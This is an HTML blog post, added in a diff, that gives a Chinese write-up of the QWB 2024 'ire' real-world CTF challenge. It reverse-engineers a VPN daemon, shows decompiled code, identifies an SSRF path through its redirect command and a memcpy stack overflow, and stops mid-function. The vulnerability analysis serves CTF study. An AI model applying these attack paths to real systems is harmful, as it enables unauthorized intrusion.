@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>qwb 2024 rw ire</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./qwb 2024 rw ire.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">qwb 2024 rw ire</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-01-22]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="ti-mu-miao-shu">题目描述</h2><pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">题目信息：
+</span><span style="color:#c0c5ce;">题目名称：ire
+</span><span style="color:#c0c5ce;">旗帜名称：IRE
+</span><span style="color:#c0c5ce;">题目描述：附件中给出了一台Ubunt64-bit 22.04.5 LTS虚拟机，环境和展示区相同但密码不同。虚拟机/home/game目录中有start.sh脚本，选手可以执行start.sh脚本启动题目环境（提供的虚拟机中已经通过服务启动）。请挖掘并利用相关程序的漏洞，实现任意命令执行，若靶机弹出计算器则挑战成功。
+</span><span style="color:#c0c5ce;">附件信息：虚拟机用户名和口令为game/game
+</span><span style="color:#c0c5ce;">台上拓扑：交换机同时连接选手攻击机和靶机。靶机中使用vmware（最新版）启动附件中的Ubunt64-bit 22.04.5 LTS环境，并以game用户登录。
+</span><span style="color:#c0c5ce;">展示目标：选手携带自己的攻击机上台，接入靶机所在网段开始进行脆弱性检测，若在规定时间内靶机弹出计算器，即为挑战成功。
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">展示时操作人员操作步骤：
+</span><span style="color:#c0c5ce;">1）	回复虚拟机快照到初始状态； 
+</span><span style="color:#c0c5ce;">2）	测试网络是否能够连通，如网络通联状况正常则可示意选手开始，同时开始计时；
+</span><span style="color:#c0c5ce;">3）	成功或超时后，关闭虚拟机、回复虚拟机快照到初始状态。
+</span></pre>
+<h2 id="fu-wu-fen-xi">服务分析</h2><p><code>sbgwd</code> 实现一个VPN功能</p>
+<p>服务</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">game@box:~$ cat /etc/systemd/system/myservice.service
+</span><span style="color:#c0c5ce;">[Unit]
+</span><span style="color:#c0c5ce;">Description=My Custom Script Service
+</span><span style="color:#c0c5ce;">After=network.target
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">[Service]
+</span><span style="color:#c0c5ce;">ExecStart=/home/game/start.sh
+</span><span style="color:#c0c5ce;">Restart=on-failure
+</span><span style="color:#c0c5ce;">User=root
+</span><span style="color:#c0c5ce;">Group=root
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">[Install]
+</span><span style="color:#c0c5ce;">WantedBy=multi-user.target
+</span></pre>
+<p>查看服务情况</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">game@box:~$ systemctl status myservice.service
+</span><span style="color:#c0c5ce;">● myservice.service - My Custom Script Service
+</span><span style="color:#c0c5ce;">     Loaded: loaded (/etc/systemd/system/myservice.service; enabled; vendor preset: enabled)
+</span><span style="color:#c0c5ce;">     Active: active (running) since Fri 2024-12-06 11:11:11 UTC; 5 days ago
+</span><span style="color:#c0c5ce;">   Main PID: 1083 (start.sh)
+</span><span style="color:#c0c5ce;">      Tasks: 6 (limit: 4514)
+</span><span style="color:#c0c5ce;">     Memory: 6.3M
+</span><span style="color:#c0c5ce;">        CPU: 112ms
+</span><span style="color:#c0c5ce;">     CGroup: /system.slice/myservice.service
+</span><span style="color:#c0c5ce;">             ├─1083 /bin/bash /home/game/start.sh
+</span><span style="color:#c0c5ce;">             └─1086 /home/game/sbgwd
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">Dec 12 07:13:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:18:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:23:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:28:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:33:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:38:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:43:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:48:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:53:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span><span style="color:#c0c5ce;">Dec 12 07:58:33 box sbgwd[1086]: current_clients=0 max_clients=1
+</span></pre>
+<p>端口开放情况</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">game@box:~$ sudo netstat -anp | grep tcp
+</span><span style="color:#c0c5ce;">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      5065/sshd: /usr/sbi 
+</span><span style="color:#c0c5ce;">tcp        0      0 0.0.0.0:45443           0.0.0.0:*               LISTEN      1086/sbgwd          
+</span><span style="color:#c0c5ce;">tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      1135/nginx: master  
+</span><span style="color:#c0c5ce;">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      968/systemd-resolve 
+</span><span style="color:#c0c5ce;">tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      2736/cupsd          
+</span><span style="color:#c0c5ce;">tcp        0     52 192.168.130.153:22      192.168.130.1:53078     ESTABLISHED 5495/sshd: game [pr 
+</span><span style="color:#c0c5ce;">tcp6       0      0 :::22                   :::*                    LISTEN      5065/sshd: /usr/sbi 
+</span><span style="color:#c0c5ce;">tcp6       0      0 ::1:631                 :::*                    LISTEN      2736/cupsd   
+</span></pre>
+<h2 id="ni-xiang-fen-xi">逆向分析</h2><p>一开始创建很多线程，ssl连接从<code>13064</code>处<code>SSL_accept()</code>开始，<code>SSL_read()</code>接收数据</p>
+<p>进入<code>sp_auth</code>函数中，检查报文开头是否为魔数<code>SlSP</code>，报文头长度，客户端版本等</p>
+<p>之后根据20字节处偏移的值进入一个switch菜单，其中存在重定向功能
+重定向可以用来做ssrf，访问内网80端口服务</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">__int64 __fastcall </span><span style="color:#8fa1b3;">sub_B9E0</span><span style="color:#c0c5ce;">(__int64 </span><span style="color:#bf616a;">a1</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buffer</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">length</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">a4</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">a5</span><span style="color:#c0c5ce;">, __int64 </span><span style="color:#bf616a;">a6</span><span style="color:#c0c5ce;">, _DWORD *</span><span style="color:#bf616a;">a7</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  (...)
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( *tmp_buffer_1 != &#39;</span><span style="color:#a3be8c;">PSlS</span><span style="color:#c0c5ce;">&#39; )                </span><span style="color:#65737e;">// 魔数
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    v16 = -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">magic number mismatch not auth packet </span><span style="color:#d08770;">%x</span><span style="color:#c0c5ce;">&quot;, *tmp_buffer_1);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> v16;
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  v13 = *(v9 + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( v13 &gt; </span><span style="color:#d08770;">1u </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    v16 = -</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;"> unkown client version </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, v12, v13);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">sub_81A0</span><span style="color:#c0c5ce;">(a1, </span><span style="color:#d08770;">0x80000004</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">else
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">inet_ntop</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">8 </span><span style="color:#c0c5ce;">* (*(tmp_buffer_1 + </span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, tmp_buffer_1 + </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">, buf, </span><span style="color:#d08770;">0x2Eu</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">( </span><span style="color:#8fa1b3;">__ROL2__</span><span style="color:#c0c5ce;">(*(tmp_buffer_1 + </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) )
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">      (...)
+</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;"> MAJOR_COMMAND_SET_REDIRECT_INFO</span><span style="color:#c0c5ce;">&quot;, v12);
+</span><span style="color:#c0c5ce;">        v16 = </span><span style="color:#8fa1b3;">MAJOR_COMMAND_SET_REDIRECT_INFO</span><span style="color:#c0c5ce;">(tmp_buffer_1, ret_fd);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;"> MAJOR_COMMAND_SET_REDIRECT_INFO socket... </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, v12, *ret_fd);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> v16;
+</span><span style="color:#c0c5ce;">      (...)
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> v16;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>重定向功能中<code>memcpy(&amp;v14, v4, v5 - v4);</code>存在溢出 不过没有地址信息</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">__int64 __fastcall </span><span style="color:#8fa1b3;">MAJOR_COMMAND_SET_REDIRECT_INFO</span><span style="color:#c0c5ce;">(__int64 </span><span style="color:#bf616a;">tmp_buffer</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">ret_fd</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  (...)
+</span><span style="color:#c0c5ce;">  ip_port = (tmp_buffer + v3);                  </span><span style="color:#65737e;">// 127.0.0.1:80
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">redirect info </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, ip_port);
+</span><span style="color:#c0c5ce;">  v5 = </span><span style="color:#96b5b4;">strchr</span><span style="color:#c0c5ce;">(v4, &#39;</span><span style="color:#a3be8c;">:</span><span style="color:#c0c5ce;">&#39;);
+</span><span style="color:#c0c5ce;">  v10 = v5;
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( v5 )
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( v5 != ip_port )
+</span><span style="color:#c0c5ce;">      </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(&amp;v14, ip_port, v5 - ip_port);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">redirect host </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, &amp;host);
+</span><span style="color:#c0c5ce;">    port = </span><span style="color:#96b5b4;">strtol</span><span style="color:#c0c5ce;">(v10 + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0LL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">redirect port </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, port);
+</span><span style="color:#c0c5ce;">    v12 = </span><span style="color:#8fa1b3;">connect_server</span><span style="color:#c0c5ce;">(&amp;host, port, qword_234C8);
+</span><span style="color:#c0c5ce;">    *ret_fd = v12;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">redirect socket </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, v12);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">3LL</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">else
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">not found :</span><span style="color:#c0c5ce;">&quot;, v6, v7, v8, v9, host, v15, v16, v17, v18, v19, v20, v21);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0xFFFFFFFFLL</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p><code>connect_server()</code>函数：</p>
+<ul>
+<li><code>getaddrinfo(host, s, &amp;req, &amp;pai)</code> 解析目标主机和端口</li>
+<li><code>socket(pai-&gt;ai_family, pai-&gt;ai_socktype, pai-&gt;ai_protocol);</code> 创建tcp套接字</li>
+<li><code>ioctl(v4, 0x5421uLL, &amp;v31);</code> 设置非阻塞模式</li>
+<li><code>connect(ret_fd, pai-&gt;ai_addr, pai-&gt;ai_addrlen)</code> 发起非阻塞连接，成功直接返回文件描述符；或者如果<code>errno</code>是<code>EINPROGRESS</code>（114），表示连接正在进行，可以继续处理；否则记录日志并返回<code>-1</code></li>
+<li><code>epoll_create(1)</code> 创建一个<code>epoll</code>实例</li>
+<li><code>epoll_wait(v11, &amp;events, 1, a3)</code> a3指定等待时间，可能超时或错误，否则继续</li>
+<li><code>getsockopt(ret_fd, 1, 4, &amp;optval, &amp;optlen)</code> 检查套接字是否成功</li>
+<li>最后释放资源、关闭描述符</li>
+</ul>
+<blockquote>
+<p>connect 只是发起了连接，而没有等待连接完成。需要 epoll 来：</p>
+<ul>
+<li>确定连接是否真正成功</li>
+<li>在一定的超时时间内处理连接未完成的情况</li>
+<li>避免阻塞当前线程，实现异步连接逻辑</li>
+</ul>
+</blockquote>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">__int64 __fastcall </span><span style="color:#8fa1b3;">connect_server</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">host</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">port</span><span style="color:#c0c5ce;">, __int64 </span><span style="color:#bf616a;">a3</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  (...)
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( </span><span style="color:#8fa1b3;">getaddrinfo</span><span style="color:#c0c5ce;">(host, s, &amp;req, &amp;pai) )
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    (...)
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  v4 = </span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">(pai-&gt;ai_family, pai-&gt;ai_socktype, pai-&gt;ai_protocol);
+</span><span style="color:#c0c5ce;">  ret_fd = v4;
+</span><span style="color:#c0c5ce;">  v31 = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  v6 = </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(v4, </span><span style="color:#d08770;">0x5421uLL</span><span style="color:#c0c5ce;">, &amp;v31);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( </span><span style="color:#8fa1b3;">connect</span><span style="color:#c0c5ce;">(ret_fd, pai-&gt;ai_addr, pai-&gt;ai_addrlen) != -</span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">|| (v9 = </span><span style="color:#8fa1b3;">__errno_location</span><span style="color:#c0c5ce;">(), (*v9 - </span><span style="color:#d08770;">114</span><span style="color:#c0c5ce;">) &gt; </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) || a3 &lt;= </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// return success
+</span><span style="color:#c0c5ce;">LABEL_6:
+</span><span style="color:#c0c5ce;">    v7 = pai;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( !pai )
+</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret_fd;
+</span><span style="color:#c0c5ce;">LABEL_7:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">freeaddrinfo</span><span style="color:#c0c5ce;">(v7);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret_fd;
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  v10 = </span><span style="color:#8fa1b3;">epoll_create</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  v11 = v10;
+</span><span style="color:#c0c5ce;">  (...)
+</span><span style="color:#c0c5ce;">  event.</span><span style="color:#bf616a;">events </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// EPOLLOUT
+</span><span style="color:#c0c5ce;">  event.</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">u64 </span><span style="color:#c0c5ce;">= ret_fd; </span><span style="color:#65737e;">// 监控的文件描述符
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( </span><span style="color:#8fa1b3;">epoll_ctl</span><span style="color:#c0c5ce;">(v10, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, ret_fd, &amp;event) == -</span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">   (...)
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  v12 = </span><span style="color:#8fa1b3;">epoll_wait</span><span style="color:#c0c5ce;">(v11, &amp;events, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, a3);
+</span><span style="color:#c0c5ce;">  v13 = v12;
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( !v12 )
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    (...)
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( v12 &lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    (...)
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( (events.</span><span style="color:#bf616a;">events </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    (...)
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( (events.</span><span style="color:#bf616a;">events </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    (...)
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  optval = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  optlen = </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( </span><span style="color:#8fa1b3;">getsockopt</span><span style="color:#c0c5ce;">(ret_fd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, &amp;optval, &amp;optlen) == -</span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    (...)
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( optval )
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    (...)
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( pai )
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">freeaddrinfo</span><span style="color:#c0c5ce;">(pai);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( v11 &gt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(v11);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret_fd;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>之后在transfer 12680函数实现带有SSL的在两个套接字之间的数据转发，核心代码如下
+两条数据流独立处理</p>
+<ul>
+<li>从客户端到服务器（<code>SSL_read -&gt; send</code>）</li>
+<li>从服务器到客户端（<code>recv -&gt; SSL_write</code>）
+分离读取和发送：</li>
+<li><code>SSL_read</code> 的循环专注于从客户端读取数据</li>
+<li><code>send_data</code> 独立管理发送逻辑，通过 <code>epoll</code> 确保数据完整发送
+事件驱动：</li>
+<li>服务器到客户端的数据传输是基于 <code>recv</code> 的触发，而不是主动轮询</li>
+</ul>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">__int64 __fastcall </span><span style="color:#8fa1b3;">transfer</span><span style="color:#c0c5ce;">(__int64 </span><span style="color:#bf616a;">a1</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">a2</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">redirect_fd</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( fd == in_fd )
+</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( fd == redirect_fd )
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">      </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">redirect socket ready</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">      v9 = </span><span style="color:#8fa1b3;">recv</span><span style="color:#c0c5ce;">(redirect_fd, buffer, dword_234E0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">      </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;"> redirect read </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, v4, v9);
+</span><span style="color:#c0c5ce;">      v11 = </span><span style="color:#8fa1b3;">SSL_write</span><span style="color:#c0c5ce;">(a1, buffer, v9);
+</span><span style="color:#c0c5ce;">      </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;"> client sent </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, v4, v11);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">syslog</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">client socket ready</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">  {
+</span><span style="color:#c0c5ce;">    v13 = </span><span style="color:#8fa1b3;">SSL_read</span><span style="color:#c0c5ce;">(a1, buffer, dword_234E0);
